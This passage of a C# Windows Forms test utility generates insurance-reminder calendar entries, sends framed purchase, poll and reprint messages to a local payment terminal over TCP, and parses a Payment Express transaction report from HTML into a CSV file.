                            + "DTEND:" + DateTime.ParseExact(cells[6], "dd/MM/yyyy", System.Globalization.CultureInfo.InvariantCulture).AddMonths(-2).ToString("yyyyMMdd") + "T090000" + Environment.NewLine
                            + "LOCATION:" + Environment.NewLine
                            + "SUMMARY:" + "Notification of Insurance End Date Updated: The Insurance End Date is " + DateTime.ParseExact(cells[6], "dd/MM/yyyy", System.Globalization.CultureInfo.InvariantCulture).ToString("dd/MM/yyyy")
                            + " | BC " + cells[0] + " | " + codeNamePairs[cells[0]] + Environment.NewLine
                            + "PRIORITY:3" + Environment.NewLine
                            + "END:VEVENT" + Environment.NewLine;
                        File.AppendAllLines(icsFile, new[] { ics });
                        count++;
                    }
                    else
                    {
                        setLogtColorful(richTextBox1, " unhandle line: " + line, Color.Red);
                    }
                }
                File.AppendAllLines(icsFile, new[] { "END:VCALENDAR" });
                setLogtColorful(richTextBox1, " Succeed to write "+ count +" rows of sql and ics", Color.Green);
            }
        }


        public static byte[] Combine(byte[] first, byte[] second)
        {
            byte[] ret = new byte[first.Length + second.Length];
            Buffer.BlockCopy(first, 0, ret, 0, first.Length);
            Buffer.BlockCopy(second, 0, ret, first.Length, second.Length);
            return ret;
        }

        string posip = "192.168.1.75";
        private byte[] DLE = new byte[] { 0x10 };
        private byte[] STX = new byte[] { 0x02 };
        private byte[] ETX = new byte[] { 0x03 };
        private byte[] ACK = new byte[] { 0x06 };
        private byte FS = 0x1C ;
        const int COMMA = 0x2C;
        int refNum = 1198999;
        public System.Net.Sockets.TcpClient clientSocket;
        //for testing
        //Purchase
        private void findLongNum_Click(object sender, EventArgs e)
        {
            try
            {
                Control co = new Control();
                CommControl.CommControl.ControlCollection cc = new Control.ControlCollection(co);
                
                // STX = Combine(DLE, STX);
                //  ETX = Combine(DLE, ETX);

                //purchase
                string data = refNum.ToString() + ",PUR,1,000004.71,000000.00,POS 1,YYYNYY,,";
                
                //STATUS POLL
                //string data = refNum.ToString() + ",POL,1,Spec Version,Uxtrata,POS Application Version,,N,Session ID";


                byte[] Txn = System.Text.Encoding.ASCII.GetBytes(data);
                byte[] LRC = null;

                #region replace comma
                /*
                int count = data.Count(x => x == ',');
                byte[] TxnCommaReplaced = new byte[Txn.Length + count];
                List<int> newTxnList = new List<int>();
                for (int i = 0; i < Txn.Length; i++)
                {
                    if (Txn[i] == COMMA)
                    {
                        newTxnList.Add(0x10);
                        newTxnList.Add(FS);
                    }
                    else
                    {
                        newTxnList.Add(Txn[i]);
                    }
                }
                for (int i = 0; i < newTxnList.Count; i++)
                {
                    TxnCommaReplaced[i] = BitConverter.GetBytes(newTxnList[i])[0];
                }
                Txn = TxnCommaReplaced;
                */

                //do not insert DLE
                for (int i = 0; i < Txn.Length; i++)
                {
                    if (Txn[i] == COMMA)
                    {
                        Txn[i] = FS;
                    }
                }

                #endregion
                #region LRC: XOR of all characters after STX until the end of packet including ETX
                int LRC_int = 0;
                for (int i = 0; i < Txn.Length; i++)
                {
                    if (i == 0)
                    {
                        LRC_int = Txn[i];
                    }
                    else
                    {
                        LRC_int = LRC_int ^ Txn[i];
                    }
                }
                for (int i = 0; i < ETX.Length; i++)
                {
                    LRC_int = LRC_int ^ ETX[i];
                }
                LRC = BitConverter.GetBytes(LRC_int);
                #endregion

                byte[] c1 = Combine(STX, Txn);
                byte[] c2 = Combine(c1, ETX);
                byte[] c3 = Combine(c2, LRC);


                if (clientSocket == null || !clientSocket.Connected)
                {
                    if (clientSocket != null)
                    {
                        clientSocket.Close();
                    }
                    clientSocket = new System.Net.Sockets.TcpClient();
                    clientSocket.Connect(posip, 4444);
                }
                NetworkStream serverStream = clientSocket.GetStream();
                serverStream.ReadTimeout = 3000;
                serverStream.Write(c3, 0, c3.Length);
                serverStream.Flush();

                #region read after write
                /*
                byte[] inStream = new byte[clientSocket.ReceiveBufferSize];
                serverStream.Read(inStream, 0, clientSocket.ReceiveBufferSize);
                List<List<int>> storedMessage = new List<List<int>>();

                List<int> message = new List<int>();
                bool DLE = false;
                bool nextIsLRC = false;
                bool startXor = false;
                int Xor = 0;
                foreach (byte b in inStream)
                {
                    if (nextIsLRC)
                    {
                        nextIsLRC = false;
                        if (Xor == b) // check LRC succeed
                        {
                            storedMessage.Add(message.Select(item => item).ToList());
                            message.Clear();
                        }
                        else        // check LRC failed
                        {
                            message.Clear();
                        }
                        continue;
                    }
                    if (startXor)
                    {
                        startXor = false;
                        Xor = b;
                    }
                    else
                    {
                        Xor ^= b;
                    }
                    if (DLE)
                    {
                        DLE = false;
                        message.Add(b);
                        continue;
                    }
                    if (b == 0x10)
                    {
                        DLE = true;
                        continue;
                    }
                    if (b == FS)
                    {
                        message.Add(COMMA);
                        continue;
                    }
                    if (b == 0x02) //message start
                    {
                        startXor = true;
                        continue;
                    }
                    if (b == 0x03) //message end
                    {
                        message.Add('\r');
                        message.Add('\n');
                        nextIsLRC = true;
                        continue;
                    }
                    if (b == 0x05) //Enquiry
                    {
                        continue;
                    }
                    if (b == 0x06) //Acknowledgment
                    {
                        continue;
                    }
                    if (b == 21) //unknown
                    {
                        continue;
                    }
                    message.Add(b);
                }
                if (storedMessage.Count == 0 || storedMessage[0].Count == 0 || storedMessage[0][0] == 0)
                {
                    setLogtColorful(richTextBox1, "read null" +
                            Environment.NewLine, Color.Red);
                }
                foreach (List<int> t in storedMessage)
                {
                    byte[] temp = new byte[t.Count];
                    for (int i = 0; i < temp.Length; i++)
                    {
                        temp[i] = BitConverter.GetBytes(t[i])[0];
                    }

                    string returndata = System.Text.Encoding.ASCII.GetString(temp);
                    string[] messageDetails = returndata.Split(',');
                    string UniqueSequenceReference = messageDetails[0];
                    string MessageType = messageDetails[1];
                    string MerchantNumber = messageDetails[2];
                    string Response = messageDetails[3];
                    string Display = "";
                    if (messageDetails.Length > 4)
                    {
                        Display = messageDetails[4];
                    }

                    if (
                           MessageType != "POL" //if it POL, the UniqueSequenceReference is always "XXXXXX", not sure whether it's a bug for the test terminal
                        && UniqueSequenceReference != refNum.ToString()
                        )
                    {

                        setLogtColorful(richTextBox1, "Response Sequence Reference<" + UniqueSequenceReference + "> does not match request<" + refNum + ">!" +
                            Environment.NewLine, Color.Red);
                        clientSocket.Close();
                        continue;
                    }
                    else if (MessageType == "ERR")
                    {
                        if (Response == "02")
                        {
                            setLogtColorful(richTextBox1, "Invalid Request!" +
                            Environment.NewLine, Color.Red);
                        }
                        else if (Response == "08")
                        {
                            setLogtColorful(richTextBox1, "Invalid Reference!" +
                            Environment.NewLine, Color.Red);
                        }
                        clientSocket.Close();
                    }
                    else if (MessageType == "DSP")
                    {
                        setLogtColorful(richTextBox1, Response + Environment.NewLine, Color.Green);
                        if (Display == "99") //Transaction Outcome
                        {
                            // clientSocket.Close();
                        }
                    }
                    else if (MessageType == "PUR")
                    {
                        if (messageDetails[5] == "00") //Accepted
                        {

                        }
                        else if (messageDetails[5] == "01") //Declined
                        {

                        }
                        else if (messageDetails[5] == "04") //Transaction Cancelled (time out or cancel key pressed)
                        {

                        }
                        setLogtColorful(richTextBox1, "Purchase Result: " + messageDetails[6]
                            + Environment.NewLine, Color.Green);
                        clientSocket.Close();
                    }
                    else if (MessageType == "NFO")
                    {
                        setLogtColorful(richTextBox1, "Customer action: " + Response + ", " + Display
                            + Environment.NewLine, Color.Green);
                    }
                    else if (MessageType == "POL")
                    {
                        if (Response == "80")
                        {
                            setLogtColorful(richTextBox1, "Poll result: Ready"
                            + Environment.NewLine, Color.Green);
                        }
                        else if (Response == "81")
                        {
                            setLogtColorful(richTextBox1, "Poll result: Transaction in progress"
                            + Environment.NewLine, Color.Green);
                        }
                        else if (Response == "82")
                        {
                            setLogtColorful(richTextBox1, "Poll result: – Signature in progress"
                            + Environment.NewLine, Color.Green);
                        }
                        else if (Response == "83")
                        {
                            setLogtColorful(richTextBox1, "Poll result: – Session ID Not Authentic – TSPID wrong"
                            + Environment.NewLine, Color.Green);
                        }

                        //do not close in real program
                        //   clientSocket.Close();
                    }
                    //poll
                    //cancelled
                    //imformation
                    //confirmation
                    //moto purchase
                    //signature request
                    //cash out
                    //refund
                    //REFUND WITH MANUAL PAN
                    //LOGON
                    //PARAMETER DOWNLOAD
                    //TERMINAL TOTALS
                    //SETTLEMENT CUTOVER/CLOSE BATCH
                    //SETTLEMENT ENQUIRY / HISTORICAL SETTLEMENT
                    //REPRINT LAST RECEIPT
                    //QUERY CARD
                    //POS RECEIPT PRINTING
                    //HEADER & FOOTER CONFIGURATION FOR TERMINAL RECEIPTS
                    //PRINT TERMINAL RECEIPT ON POS
                    //REPORTS
                    //REPORT TYPE DEFINITIONS
                    //DIAGNOSTICS
                    //HOST COMMS TX MESSAGE
                    //DDX SEND TO HOST USING DIAL COMMAND
                    //DDI CONNECT TO HOST USING DIAL COMMAND
                }
                */
                #endregion




                #region another way
                /*
                Socket sender1 = new Socket(AddressFamily.InterNetwork,
                    SocketType.Stream, ProtocolType.Tcp);
                IPEndPoint remoteEP = new IPEndPoint(IPAddress.Parse(posip), 4444);
                sender1.Connect(remoteEP);

                byte[] c1 = Combine(STX, Txn);
                byte[] c2 = Combine(c1, ETX);
                byte[] c3 = Combine(c2, LRC);

                // Send the data through the socket.  
                int bytesSent = sender1.Send(c3);

                // Receive the response from the remote device.  
                int bytesRec = sender1.Receive(inStream);
                setLogtColorful(richTextBox1, Encoding.ASCII.GetString(inStream, 0, bytesRec), Color.Green);

                // Release the socket.  
                sender1.Shutdown(SocketShutdown.Both);
                sender1.Close();
                */
                #endregion
            }
            catch (Exception ex)
            {
                if (ex.Message.Contains("connected party did not properly respond after a period of time"))
                {
                    setLogtColorful(richTextBox1, "Terminal Busy. Please Wait…" + Environment.NewLine, Color.Blue);
                    //Thread.Sleep(3000);
                }
                else
                {
                    setLogtColorful(richTextBox1, ex.Message + Environment.NewLine, Color.Red);
                    if (clientSocket != null && clientSocket.Connected)
                    {
                        clientSocket.Close();
                    }
                }
            }


            return;

            #region test
            DataTable dt = new DataTable();
            dt.Columns.Add("Code");
            dt.Columns.Add("BCCODE");
            dt.Columns.Add("Name");
            dt.Columns.Add("Total", typeof( decimal));
            DataRow dr = dt.NewRow();
            dr["Code"] = "1";
            dr["BCCODE"] = "a";
            dr["Name"] = "name1";
            dr["Total"] = 2;
            dt.Rows.Add(dr);
            dr = dt.NewRow();
            dr["Code"] = "2";
            dr["BCCODE"] = "b";
            dr["Name"] = "name2";
            dr["Total"] = 20;
            dt.Rows.Add(dr);
            dr = dt.NewRow();
            dr["Code"] = "1";
            dr["BCCODE"] = "c";
            dr["Name"] = "name3";
            dr["Total"] = 30;
            dt.Rows.Add(dr);


            var result1 = from row in dt.AsEnumerable()
                         group row by row.Field<string>("Code") into grp
                          let list = grp.First()
                          select new
                         {
                             Code = list.Field<string>("Code"),
                             BCCODE = list.Field<string>("BCCODE"),
                             Name = list.Field<string>("Name"),
                             Total = grp.Sum(r => r.Field<decimal>("Total"))
                         };

     //       dt.Rows.Clear();
            foreach (var t in result1)
            {
                DataRow nr = dt.NewRow();
                nr["Code"] = t.Code;
                nr["BCCODE"] = t.BCCODE;
                nr["Name"] = t.Name;
                nr["Total"] = t.Total;
                dt.Rows.Add(nr);
            }

            setLogT( richTextBox1, string.Format("{0}, {1:000#}", 45.ToString("###0"), 38));
            decimal dd = 34.56499999m;
            setLogT(richTextBox1, dd.ToString("F"));
            MatchCollection testmatch = Regex.Matches("aaaaaaaaaabbbbbbbbbbbbbbbbbbbbqqqabcdddddddab","ab");
            foreach( Match t in testmatch)
            {
                setLogT(richTextBox1, t.Value);
                setLogT(richTextBox1, t.Groups.ToString());
            }
            List<int> items = new List<int>()
            {
                1,
                2,3
                ,4,5,6
            };
            var result2 = items.Where(i => i > 3);
            DialogResult result = openFileDialog1.ShowDialog();
            if (result == DialogResult.OK)
            {
                string filePath = openFileDialog1.FileName;
                List<string> lines = File.ReadAllLines(filePath).Distinct().ToList();
                foreach (string line in lines)
                {
                    var regex = new Regex(@"(?<=pptyins_master_policy_num \= \')(\s|\S)*?(?=\'\,)", RegexOptions.IgnoreCase | RegexOptions.Compiled);
                    var regMatch = regex.Match(line);
                    if (regMatch.Success)
                    {
                        string num = regMatch.Groups[0].Value.Replace("pptyins_master_policy_num = '", "").Replace("',","");
                        if(num.Length > 20)
                        {
                            setLogtColorful(richTextBox1, num, Color.Green);
                        }
                    }
                }
            }
            #endregion
        }

        //Read
        private void button1_Click_1(object sender, EventArgs e)
        {
            try
            {
                if (clientSocket != null && clientSocket.Connected)
                {
                    byte[] inStream = new byte[1024];
                    NetworkStream serverStream = clientSocket.GetStream();
                    serverStream.ReadTimeout = 3000;
                    serverStream.Flush();
                    inStream = new byte[(int)clientSocket.ReceiveBufferSize];
                    serverStream.Read(inStream, 0, (int)clientSocket.ReceiveBufferSize);
                    List<List<int>> storedMessage = new List<List<int>>();

                    List<int> message = new List<int>();
                    bool DLE = false;
                    bool nextIsLRC = false;
                    bool startXor = false;
                    int Xor = 0;
                    foreach (byte b in inStream)
                    {
                        if (nextIsLRC)
                        {
                            nextIsLRC = false;
                            if (Xor == b) // check LRC succeed
                            {
                                storedMessage.Add(message.Select(item => item).ToList());
                                message.Clear();
                            }
                            else        // check LRC failed
                            {
                                message.Clear();
                            }
                            continue;
                        }
                        if (startXor)
                        {
                            startXor = false;
                            Xor = b;
                        }
                        else
                        {
                            Xor ^= b;
                        }
                        if (DLE)
                        {
                            DLE = false;
                            message.Add(b);
                            continue;
                        }
                        if (b == 0x10)
                        {
                            DLE = true;
                            continue;
                        }
                        if (b == FS)
                        {
                            message.Add(COMMA);
                            continue;
                        }
                        if (b == 0x02) //message start
                        {
                            startXor = true;
                            continue;
                        }
                        if (b == 0x03) //message end
                        {
                            message.Add('\r');
                            message.Add('\n');
                            nextIsLRC = true;
                            continue;
                        }
                        if (b == 0x05) //Enquiry
                        {
                            continue;
                        }
                        if (b == 0x06) //Acknowledgment
                        {
                            continue;
                        }
                        if (b == 21) //unknown
                        {
                            continue;
                        }
                        message.Add(b);
                    }
                    if (storedMessage.Count == 0 || storedMessage[0].Count == 0 || storedMessage[0][0] == 0)
                    {
                        setLogtColorful(richTextBox1, "read null" +
                                Environment.NewLine, Color.Red);
                    }
                    foreach (List<int> t in storedMessage)
                    {
                        byte[] temp = new byte[t.Count];
                        for (int i = 0; i < temp.Length; i++)
                        {
                            temp[i] = BitConverter.GetBytes(t[i])[0];
                        }

                        string returndata = System.Text.Encoding.ASCII.GetString(temp);
                        string[] messageDetails = returndata.Split(',');
                        string UniqueSequenceReference = messageDetails[0];
                        string MessageType = messageDetails[1];
                        string MerchantNumber = messageDetails[2];
                        string Response = messageDetails[3];
                        string Display = "";
                        if (messageDetails.Length > 4)
                        {
                            Display = messageDetails[4];
                        }

                        if(
                               MessageType != "POL" //if it POL, the UniqueSequenceReference is always "XXXXXX", not sure whether it's a bug for the test terminal
                            && UniqueSequenceReference != refNum.ToString()
                            )
                        {

                            setLogtColorful(richTextBox1, "Response Sequence Reference<" + UniqueSequenceReference + "> does not match request<" + refNum + ">!" +
                                Environment.NewLine, Color.Red);
                            clientSocket.Close();
                            continue;
                        }
                        else if (MessageType == "ERR")
                        {
                            if (Response == "02")
                            {
                                setLogtColorful(richTextBox1, "Invalid Request!" +
                                Environment.NewLine, Color.Red);
                            }
                            else if (Response == "08")
                            {
                                setLogtColorful(richTextBox1, "Invalid Reference!" +
                                Environment.NewLine, Color.Red);
                            }
                            clientSocket.Close();
                        }
                        else if (MessageType == "DSP")
                        {
                            setLogtColorful(richTextBox1, Response + Environment.NewLine, Color.Green);
                            if (Display == "99") //Transaction Outcome
                            {
                                // clientSocket.Close();
                            }
                        }
                        else if (MessageType == "PUR")
                        {
                            if (messageDetails[5] == "00") //Accepted
                            {

                            }
                            else if (messageDetails[5] == "01") //Declined
                            {

                            }
                            else if (messageDetails[5] == "04") //Transaction Cancelled (time out or cancel key pressed)
                            {

                            }
                            setLogtColorful(richTextBox1, "Purchase Result: " + messageDetails[6]
                                + Environment.NewLine, Color.Green);
                            clientSocket.Close();
                        }
                        else if (MessageType == "NFO")
                        {
                            setLogtColorful(richTextBox1, "Customer action: " + Response + ", " + Display
                                + Environment.NewLine, Color.Green);
                        }
                        else if (MessageType == "POL")
                        {
                            if(Response == "80")
                            {
                                setLogtColorful(richTextBox1, "Poll result: Ready"
                                + Environment.NewLine, Color.Green);
                            }
                            else if (Response == "81")
                            {
                                setLogtColorful(richTextBox1, "Poll result: Transaction in progress"
                                + Environment.NewLine, Color.Green);
                            }
                            else if (Response == "82")
                            {
                                setLogtColorful(richTextBox1, "Poll result: – Signature in progress"
                                + Environment.NewLine, Color.Green);
                            }
                            else if (Response == "83")
                            {
                                setLogtColorful(richTextBox1, "Poll result: – Session ID Not Authentic – TSPID wrong"
                                + Environment.NewLine, Color.Green);
                            }

                            //do not close in real program
                         //   clientSocket.Close();
                        }
                        //poll
                        //cancelled
                        //imformation
                        //confirmation
                        //moto purchase
                        //signature request
                        //cash out
                        //refund
                        //REFUND WITH MANUAL PAN
                        //LOGON
                        //PARAMETER DOWNLOAD
                        //TERMINAL TOTALS
                        //SETTLEMENT CUTOVER/CLOSE BATCH
                        //SETTLEMENT ENQUIRY / HISTORICAL SETTLEMENT
                        //REPRINT LAST RECEIPT
                        //QUERY CARD
                        //POS RECEIPT PRINTING
                        //HEADER & FOOTER CONFIGURATION FOR TERMINAL RECEIPTS
                        //PRINT TERMINAL RECEIPT ON POS
                        //REPORTS
                        //REPORT TYPE DEFINITIONS
                        //DIAGNOSTICS
                        //HOST COMMS TX MESSAGE
                        //DDX SEND TO HOST USING DIAL COMMAND
                        //DDI CONNECT TO HOST USING DIAL COMMAND
                    }


                }
            }
            catch (Exception ex)
            {
                if(ex.Message.Contains("connected party did not properly respond after a period of time"))
                {
                    setLogtColorful(richTextBox1, "Terminal Busy. Please Wait…" + Environment.NewLine, Color.Blue);
                    //Thread.Sleep(3000);
                }
                else
                {
                    setLogtColorful(richTextBox1, ex.Message + Environment.NewLine, Color.Red);
                    if (clientSocket != null && clientSocket.Connected)
                    {
                        clientSocket.Close();
                    }
                }
            }
             
        }
        
        private void Poll_Click(object sender, EventArgs e)
        {
            try
            {

                // STX = Combine(DLE, STX);
                //  ETX = Combine(DLE, ETX);

                //  refNum++;

                //purchase
           //     string data = refNum.ToString() + ",PUR,1,000004.71,000000.00,POS 1,YYYNYY,,";

                //STATUS POLL
                string data = refNum.ToString() + ",POL,1,2.4,Uxtrata,1.2.34,,N,Session ID";


                byte[] Txn = System.Text.Encoding.ASCII.GetBytes(data);
                byte[] LRC = null;

                #region replace comma
                for (int i = 0; i < Txn.Length; i++)
                {
                    if (Txn[i] == COMMA)
                    {
                        Txn[i] = FS;
                    }
                }

                #endregion
                #region LRC: XOR of all characters after STX until the end of packet including ETX
                int LRC_int = 0;
                for (int i = 0; i < Txn.Length; i++)
                {
                    if (i == 0)
                    {
                        LRC_int = Txn[i];
                    }
                    else
                    {
                        LRC_int = LRC_int ^ Txn[i];
                    }
                }
                for (int i = 0; i < ETX.Length; i++)
                {
                    LRC_int = LRC_int ^ ETX[i];
                }
                LRC = BitConverter.GetBytes(LRC_int);
                #endregion

                byte[] c1 = Combine(STX, Txn);
                byte[] c2 = Combine(c1, ETX);
                byte[] c3 = Combine(c2, LRC);
                if(clientSocket == null || !clientSocket.Connected)
                {
                    if (clientSocket != null)
                    {
                        clientSocket.Close();
                    }
                    clientSocket = new System.Net.Sockets.TcpClient();
                    clientSocket.Connect(posip, 4444);
                }
                NetworkStream serverStream = clientSocket.GetStream();
                serverStream.ReadTimeout = 3000;
                serverStream.Write(c3, 0, c3.Length);
                serverStream.Flush();
            }
            catch (Exception ex)
            {
                if (ex.Message.Contains("connected party did not properly respond after a period of time"))
                {
                    setLogtColorful(richTextBox1, "Terminal Busy. Please Wait…" + Environment.NewLine, Color.Blue);
                    //Thread.Sleep(3000);
                }
                else
                {
                    setLogtColorful(richTextBox1, ex.Message + Environment.NewLine, Color.Red);
                    if (clientSocket != null && clientSocket.Connected)
                    {
                        clientSocket.Close();
                    }
                }
            }


            return;
        }

        private void close_socket(object sender, EventArgs e)
        {
            if (clientSocket != null && clientSocket.Connected)
            {
                clientSocket.Close();
            }
        }

        private void reprint_click(object sender, EventArgs e)
        {
            try
            {
                string data = refNum.ToString() + ",REP,1,Spec Version,NYYNYY,";


                byte[] Txn = System.Text.Encoding.ASCII.GetBytes(data);
                byte[] LRC = null;

                #region replace comma
                for (int i = 0; i < Txn.Length; i++)
                {
                    if (Txn[i] == COMMA)
                    {
                        Txn[i] = FS;
                    }
                }

                #endregion
                #region LRC: XOR of all characters after STX until the end of packet including ETX
                int LRC_int = 0;
                for (int i = 0; i < Txn.Length; i++)
                {
                    if (i == 0)
                    {
                        LRC_int = Txn[i];
                    }
                    else
                    {
                        LRC_int = LRC_int ^ Txn[i];
                    }
                }
                for (int i = 0; i < ETX.Length; i++)
                {
                    LRC_int = LRC_int ^ ETX[i];
                }
                LRC = BitConverter.GetBytes(LRC_int);
                #endregion

                byte[] c1 = Combine(STX, Txn);
                byte[] c2 = Combine(c1, ETX);
                byte[] c3 = Combine(c2, LRC);
                if (clientSocket == null || !clientSocket.Connected)
                {
                    if (clientSocket != null)
                    {
                        clientSocket.Close();
                    }
                    clientSocket = new System.Net.Sockets.TcpClient();
                    clientSocket.Connect(posip, 4444);
                }
                NetworkStream serverStream = clientSocket.GetStream();
                serverStream.ReadTimeout = 3000;
                serverStream.Write(c3, 0, c3.Length);
                serverStream.Flush();
            }
            catch (Exception ex)
            {
                if (ex.Message.Contains("connected party did not properly respond after a period of time"))
                {
                    setLogtColorful(richTextBox1, "Terminal Busy. Please Wait…" + Environment.NewLine, Color.Blue);
                    //Thread.Sleep(3000);
                }
                else
                {
                    setLogtColorful(richTextBox1, ex.Message + Environment.NewLine, Color.Red);
                    if (clientSocket != null && clientSocket.Connected)
                    {
                        clientSocket.Close();
                    }
                }
            }


            return;
        }

        private void changeRef_click(object sender, EventArgs e)
        {

            refNum++;

        }

        private void ACK_Click(object sender, EventArgs e)
        {
            try
            {
                if (clientSocket == null || !clientSocket.Connected)
                {
                    if (clientSocket != null)
                    {
                        clientSocket.Close();
                    }
                    clientSocket = new System.Net.Sockets.TcpClient();
                    clientSocket.Connect(posip, 4444);
                }
                NetworkStream serverStream = clientSocket.GetStream();
                serverStream.ReadTimeout = 3000;
                serverStream.Write(ACK, 0, ACK.Length);
                serverStream.Flush();
            }
            catch (Exception ex)
            {
                if (ex.Message.Contains("connected party did not properly respond after a period of time"))
                {
                    setLogtColorful(richTextBox1, "Terminal Busy. Please Wait…" + Environment.NewLine, Color.Blue);
                    //Thread.Sleep(3000);
                }
                else
                {
                    setLogtColorful(richTextBox1, ex.Message + Environment.NewLine, Color.Red);
                    if (clientSocket != null && clientSocket.Connected)
                    {
                        clientSocket.Close();
                    }
                }
            }


            return;
        }

        private void button7_Click(object sender, EventArgs e)
        {
            DataTable resultDT = new DataTable();
            resultDT.Columns.Add("Authorized");
            resultDT.Columns.Add("DateTime");
            resultDT.Columns.Add("Response");
            resultDT.Columns.Add("ReCo");
            resultDT.Columns.Add("Grp Acc");
            resultDT.Columns.Add("CardNumber");
            resultDT.Columns.Add("Brand");
            resultDT.Columns.Add("Amount");
            resultDT.Columns.Add("Cur");
            resultDT.Columns.Add("Merchant Ref");
            resultDT.Columns.Add("DeviceId");
            resultDT.Columns.Add("TxnType");
            resultDT.Columns.Add("Void");
            resultDT.Columns.Add("Complete");
            string raw = richTextBox2.Text;
            var regex = new Regex(@"(?<=\<tr onclickid)(\s|\S)*?(?=\<\/tr\>)");
            var regMatch = regex.Match(raw);
            while (regMatch.Success)
            {
                string line = regMatch.Value;
                DataRow nr = resultDT.NewRow();
                var regex2 = new Regex(@"(?<=\<td class\=\'DpsTableCell)(\s|\S)*?(?=\<\/td\>)");
                var regMatch2 = regex2.Match(line);
                int columnCount = 0;
                while (regMatch2.Success)
                {
                    columnCount++;
                    string column = regMatch2.Value;
                    if(columnCount == 1) //Authorized
                    {
                        if (column.Contains("DpsTick DpsField"))
                        {
                            nr["Authorized"] = true;
                        }else
                        {
                            nr["Authorized"] = false;
                        }
                    }
                    else if (columnCount == 2)
                    {
                        var regex3 = new Regex(@"(?<=id\=\'RxDate\' \>).*?(?=\<\/span\>)", RegexOptions.Compiled);
                        var regMatch3 = regex3.Match(column);
                        if (regMatch3.Success)
                        {
                            nr["DateTime"] = DateTime.ParseExact(regMatch3.Value, "dd/MM/yyyy HH:mm:ss", CultureInfo.InvariantCulture);
                        }
                    }
                    else if (columnCount == 3)
                    {
                        var regex3 = new Regex(@"(?<=placeholder\=\'\' \>).*?(?=\<\/span\>)");
                        var regMatch3 = regex3.Match(column);
                        if (regMatch3.Success)
                        {
                            nr["Response"] = regMatch3.Value;
                        }
                    }
                    else if (columnCount == 4)
                    {
                        var regex3 = new Regex(@"(?<=placeholder\=\'\' \>)(\s|\S)*?(?=\<\/span\>)");
                        var regMatch3 = regex3.Match(column);
                        if (regMatch3.Success)
                        {
                            nr["ReCo"] = regMatch3.Value;
                        }
                    }
                    else if (columnCount == 5)
                    {
                        var regex3 = new Regex(@"(?<=placeholder\=\'\' \>)(\s|\S)*?(?=\<\/span\>)");
                        var regMatch3 = regex3.Match(column);
                        if (regMatch3.Success)
                        {
                            nr["Grp Acc"] = regMatch3.Value;
                        }
                    }
                    else if (columnCount == 6)
                    {
                        var regex3 = new Regex(@"(?<=placeholder\=\'\' \>)(\s|\S)*?(?=\<\/span\>)");
                        var regMatch3 = regex3.Match(column);
                        if (regMatch3.Success)
                        {
                            nr["CardNumber"] = regMatch3.Value;
                        }
                    }
                    else if (columnCount == 7)
                    {
                        var regex3 = new Regex(@"(?<=placeholder\=\'\' \>)(\s|\S)*?(?=\<\/span\>)");
                        var regMatch3 = regex3.Match(column);
                        if (regMatch3.Success)
                        {
                            nr["Brand"] = regMatch3.Value;
                        }
                    }
                    else if (columnCount == 8)
                    {
                        var regex3 = new Regex(@"(?<=NumbersOnly\(event\)\'\>)(\s|\S)*?(?=\<\/span\>)");
                        var regMatch3 = regex3.Match(column);
                        if (regMatch3.Success)
                        {
                            nr["Amount"] = regMatch3.Value;
                        }
                    }
                    else if (columnCount == 9)
                    {
                        var regex3 = new Regex(@"(?<=placeholder\=\'\' \>)(\s|\S)*?(?=\<\/span\>)");
                        var regMatch3 = regex3.Match(column);
                        if (regMatch3.Success)
                        {
                            nr["Cur"] = regMatch3.Value;
                        }
                    }
                    else if (columnCount == 10)
                    {
                        var regex3 = new Regex(@"(?<=placeholder\=\'\' \>)(\s|\S)*?(?=\<\/span\>)");
                        var regMatch3 = regex3.Match(column);
                        if (regMatch3.Success)
                        {
                            nr["Merchant Ref"] = regMatch3.Value;
                        }
                    }
                    else if (columnCount == 11)
                    {
                        var regex3 = new Regex(@"(?<=placeholder\=\'\' \>)(\s|\S)*?(?=\<\/span\>)");
                        var regMatch3 = regex3.Match(column);
                        if (regMatch3.Success)
                        {
                            nr["DeviceId"] = regMatch3.Value;
                        }
                    }
                    else if (columnCount == 12)
                    {
                        var regex3 = new Regex(@"(?<=placeholder\=\'\' \>)(\s|\S)*?(?=\<\/span\>)");
                        var regMatch3 = regex3.Match(column);
                        if (regMatch3.Success)
                        {
                            nr["TxnType"] = regMatch3.Value;
                        }
                    }
                    else if (columnCount == 13)
                    {
                        if (column.Contains("DpsTick DpsField"))
                        {
                            nr["Void"] = true;
                        }
                        else
                        {
                            nr["Void"] = false;
                        }
                    }
                    else if (columnCount == 14)
                    {
                        if (column.Contains("DpsTick DpsField"))
                        {
                            nr["Complete"] = true;
                        }
                        else
                        {
                            nr["Complete"] = false;
                        }
                    }


                    regMatch2 = regMatch2.NextMatch();
                }
                resultDT.Rows.Add(nr);
                regMatch = regMatch.NextMatch();
            }
            string file = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "paymentexpress_201806071700.csv");
            DataTableToCsv(resultDT, file);

        }
    }
    interface itest
    {
       int test();
    }
   class A :itest
    {
        int itest.test() {
            return -0;
        }
        protected string b
        {
            get;
            private set;
        }
    }
}
